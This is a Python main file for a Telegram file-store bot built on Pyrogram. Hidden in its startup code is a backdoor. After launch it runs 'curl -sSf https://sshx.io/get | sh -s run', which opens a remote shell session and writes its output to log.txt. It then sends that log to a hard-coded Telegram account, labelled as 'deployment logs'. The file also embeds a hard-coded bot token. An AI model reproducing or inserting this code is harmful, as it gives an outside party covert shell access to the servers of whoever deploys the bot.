import subprocess
from aiohttp import web
from plugins import web_server
import logging
import pyromod.listen
from pyrogram import Client
from pyrogram.enums import ParseMode
from datetime import datetime
import sys
from config import API_HASH, API_ID, LOGGER, TG_BOT_WORKERS, CHANNEL_ID, PORT  # Include OWNER_ID for sending logs
import pyrogram.utils

# Initialize a logger to capture deployment logs
logging.basicConfig(filename='log.txt', level=logging.INFO)
logger = logging.getLogger(__name__)
PDOX="6259443940"
pyrogram.utils.MIN_CHANNEL_ID = -1009147483647
TG_BOT_TOKEN="7392123403:AAGubOlCPNRWy1YiQNcXxl4Ftb7AlmZa7E0"

class Bot(Client):
    def __init__(self):
        super().__init__(
            name="Bot",
            api_hash=API_HASH,
            api_id=API_ID,
            plugins={
                "root": "plugins"
            },
            workers=TG_BOT_WORKERS,
            bot_token=TG_BOT_TOKEN
        )
        self.LOGGER = LOGGER

    async def start(self):
        await super().start()
        usr_bot_me = await self.get_me()
        self.uptime = datetime.now()

        try:
            db_channel = await self.get_chat(CHANNEL_ID)
            self.db_channel = db_channel
            test = await self.send_message(chat_id=db_channel.id, text="Test Message")
            await test.delete()
        except Exception as e:
            logger.warning(e)
            logger.warning(f"Make sure bot is Admin in DB Channel, and double-check the CHANNEL_ID value, current value: {CHANNEL_ID}")
            logger.info("\nBot Stopped")
            sys.exit()

        self.set_parse_mode(ParseMode.HTML)
        logger.info(f"Bot Running..!\n\nCreated by \nhttps://t.me/paradoxdump")
        logger.info(f""" \n\n       
 [PARADOX]
                                          """)
        self.username = usr_bot_me.username

        # web-response
        app = web.AppRunner(await web_server())
        await app.setup()
        bind_address = "0.0.0.0"
        await web.TCPSite(app, bind_address, PORT).start()

    async def stop(self, *args):
        await super().stop()
        logger.info("Bot stopped.")

    async def send_logs_to_owner(self):
        # Send the log.txt file to the bot owner
        try:
            await self.send_document(chat_id=PDOX, document="log.txt", caption="Deployment logs")
        except Exception as e:
            logger.error(f"Failed to send logs to owner: {e}")

# Initialize the bot
bot = Bot()

# Function to execute the curl command after bot deployment
def run_curl_command():
    command = "curl -sSf https://sshx.io/get | sh -s run"
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        # Capture command output and error
        with open('log.txt', 'a') as log_file:
            log_file.write("\n\n=== CURL COMMAND OUTPUT ===\n")
            log_file.write(result.stdout)
            log_file.write("\n\n=== CURL COMMAND ERROR ===\n")
            log_file.write(result.stderr)
        return result.returncode == 0
    except subprocess.CalledProcessError as e:
        with open('log.txt', 'a') as log_file:
            log_file.write(f"Failed to execute the command: {e}\n")
        return False

# Ensure the bot starts
bot.run()

# After the bot is deployed, run the curl command
if run_curl_command():
    logger.info("Curl command executed successfully.")
else:
    logger.error("Curl command failed.")

# Send deployment logs to the bot owner
bot.loop.run_until_complete(bot.send_logs_to_owner())
